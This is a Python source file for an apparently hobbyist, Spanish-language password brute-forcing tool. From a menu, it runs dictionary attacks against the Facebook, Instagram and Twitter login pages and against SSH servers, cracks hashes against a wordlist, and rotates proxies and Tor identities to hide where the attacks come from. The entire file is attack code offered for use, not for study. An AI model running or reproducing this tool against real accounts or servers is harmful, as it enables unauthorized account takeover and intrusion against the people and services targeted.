import hashlib
import os
import paramiko
import requests
import time
from colorama import Fore, init
from stem import Signal
from stem.control import Controller

init(autoreset=True)

PIXEL_ART = f"""
{Fore.RED}
  ____  _____ _   _ _______ _____ ____  _____ _______ ______ _____  
 |  _ \\|  __| | | |__   __|_   _/ __ \\|  __ \\__   __|  ____|  __ \\ 
 | |_) | |__| | | |  | |    | || |  | | |__) | | |  | |__  | |__) |
 |  _ <|  __| | | |  | |    | || |  | |  _  /  | |  |  __| |  _  / 
 | |_) | |  | |_| |  | |   _| || |__| | | \\ \\  | |  | |____| | \\ \\ 
 |____/|_|   \\___/   |_|  |_____\\____/|_|  \\_\\ |_|  |______|_|  \\_\\
{Fore.RESET}
"""

TITULO = f"{Fore.RED}BRUTEFORCE BY @RHaelXyz{Fore.RESET}"

LINKS = {
    "Facebook": "https://facebook.com/login",
    "Instagram": "https://instagram.com/login",
    "Twitter": "https://twitter.com/login",
}

def cargar_diccionario(ruta_diccionario):
    with open(ruta_diccionario, 'r', encoding='utf-8', errors='ignore') as archivo:
        return [linea.strip() for linea in archivo]

def cargar_proxies(ruta_proxies):
    if os.path.exists(ruta_proxies):
        with open(ruta_proxies, 'r', encoding='utf-8') as archivo:
            return [linea.strip() for linea in archivo if linea.strip()]
    return []

def generar_hash(contraseña, algoritmo='sha256'):
    hash_func = hashlib.new(algoritmo)
    hash_func.update(contraseña.encode('utf-8'))
    return hash_func.hexdigest()

def rotar_proxy(proxies):
    return proxies.pop(0) if proxies else None

def cambiar_ip_tor():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

def verificar_vpn():
    try:
        respuesta = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip_actual = respuesta.json()["ip"]
        print(f"{Fore.GREEN}VPN activa. IP actual: {ip_actual}{Fore.RESET}")
    except Exception:
        print(f"{Fore.RED}VPN no detectada. Usando conexión directa.{Fore.RESET}")

def ataque_diccionario_http(url, diccionario, proxies):
    proxy = rotar_proxy(proxies)
    proxies_config = {"http": proxy, "https": proxy} if proxy else None
    for palabra in diccionario:
        try:
            respuesta = requests.post(url, data={'username': 'admin', 'password': palabra}, proxies=proxies_config)
            if "Login failed" not in respuesta.text:
                return palabra
        except requests.RequestException as e:
            print(f"Error de conexión: {e}")
            return None
    return None

def ataque_diccionario_ssh(host, puerto, usuario, diccionario):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for palabra in diccionario:
        try:
            ssh.connect(host, port=puerto, username=usuario, password=palabra, timeout=5)
            print(f"{Fore.GREEN}¡Conexión exitosa! Contraseña: {palabra}{Fore.RESET}")
            ssh.close()
            return palabra
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"Error de conexión: {e}")
            break
    return None

def ataque_diccionario_hash(hash_objetivo, diccionario, algoritmo='sha256'):
    for palabra in diccionario:
        hash_palabra = generar_hash(palabra, algoritmo)
        if hash_palabra == hash_objetivo:
            return palabra
    return None

def mostrar_menu():
    print(PIXEL_ART)
    print(TITULO)
    print(f"\n{Fore.RED}Selecciona una opción:{Fore.RESET}")
    print(f"{Fore.RED}A{Fore.RESET} = Ataque HTTP/HTTPS (Facebook, Instagram, Twitter)")
    print(f"{Fore.RED}B{Fore.RESET} = Ataque SSH")
    print(f"{Fore.RED}C{Fore.RESET} = Ataque de hash")
    print(f"{Fore.RED}V{Fore.RESET} = Verificar VPN")
    print(f"{Fore.RED}T{Fore.RESET} = Cambiar IP (Tor)")
    print(f"{Fore.RED}S{Fore.RESET} = Salir")

def main():
    ruta_diccionario = 'diccionario.txt'
    ruta_proxies = 'proxies.txt'

    if not os.path.exists(ruta_diccionario):
        print(f"{Fore.RED}Error: El archivo de diccionario '{ruta_diccionario}' no existe.{Fore.RESET}")
        return

    diccionario = cargar_diccionario(ruta_diccionario)
    proxies = cargar_proxies(ruta_proxies)

    while True:
        mostrar_menu()
        opcion = input(f"{Fore.RED}Opción: {Fore.RESET}").strip().upper()

        if opcion == 'A':
            print(f"{Fore.RED}Selecciona una plataforma:{Fore.RESET}")
            for i, (plataforma, url) in enumerate(LINKS.items(), 1):
                print(f"{i}. {plataforma}")
            seleccion = int(input("Número: ")) - 1
            plataforma = list(LINKS.keys())[seleccion]
            url = list(LINKS.values())[seleccion]
            print(f"{Fore.RED}Atacando {plataforma}...{Fore.RESET}")
            contraseña = ataque_diccionario_http(url, diccionario, proxies)
            if contraseña:
                print(f"{Fore.GREEN}¡Contraseña encontrada!: {contraseña}{Fore.RESET}")
            else:
                print(f"{Fore.RED}Contraseña no encontrada en el diccionario.{Fore.RESET}")

        elif opcion == 'B':
            host = input(f"{Fore.RED}Ingresa la dirección del servidor SSH: {Fore.RESET}")
            puerto = int(input(f"{Fore.RED}Ingresa el puerto SSH (por defecto 22): {Fore.RESET}") or 22)
            usuario = input(f"{Fore.RED}Ingresa el nombre de usuario: {Fore.RESET}")
            contraseña = ataque_diccionario_ssh(host, puerto, usuario, diccionario)
            if contraseña:
                print(f"{Fore.GREEN}¡Contraseña encontrada!: {contraseña}{Fore.RESET}")
            else:
                print(f"{Fore.RED}Contraseña no encontrada en el diccionario.{Fore.RESET}")

        elif opcion == 'C':
            hash_objetivo = input(f"{Fore.RED}Ingresa el hash objetivo: {Fore.RESET}")
            algoritmo = input(f"{Fore.RED}Ingresa el algoritmo de hash (por defecto sha256): {Fore.RESET}") or 'sha256'
            contraseña = ataque_diccionario_hash(hash_objetivo, diccionario, algoritmo)
            if contraseña:
                print(f"{Fore.GREEN}¡Contraseña encontrada!: {contraseña}{Fore.RESET}")
            else:
                print(f"{Fore.RED}Contraseña no encontrada en el diccionario.{Fore.RESET}")

        elif opcion == 'V':
            verificar_vpn()

        elif opcion == 'T':
            cambiar_ip_tor()
            print(f"{Fore.GREEN}Nueva IP asignada a través de Tor.{Fore.RESET}")

        elif opcion == 'S':
            print(f"{Fore.RED}Saliendo...{Fore.RESET}")
            break

        else:
            print(f"{Fore.RED}Opción no válida. Intenta de nuevo.{Fore.RESET}")

if __name__ == "__main__":
    main()